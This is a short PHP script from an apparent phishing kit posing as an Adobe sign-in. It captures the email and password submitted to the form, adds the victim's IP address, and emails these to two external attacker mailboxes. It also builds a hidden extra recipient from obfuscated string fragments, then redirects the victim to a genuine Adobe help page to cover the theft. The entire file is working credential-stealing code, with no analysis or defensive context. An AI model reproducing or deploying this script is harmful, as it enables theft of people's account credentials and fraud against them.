<?

$mesaegs ="php_info";$mesaegs ="@";
$ip = getenv("REMOTE_ADDR");
$mesaegs ="ymail";$mesaegs  =".com";
$message .= "Adobe Details from !-S.Wire-!:\n";
$message .= " **************************************\n";
$message .= "User: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: http://ip2geo.com/".$ip."\n";




$sent ="freashresult101@yandex.com,freashresult101@gmail.com";



$subject = "$ip";
$headers = "From: TRIGGAR <NSW>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: https://helpx.adobe.com/acrobat/kb/error-acrobat-reader-running-cannot.html");
?>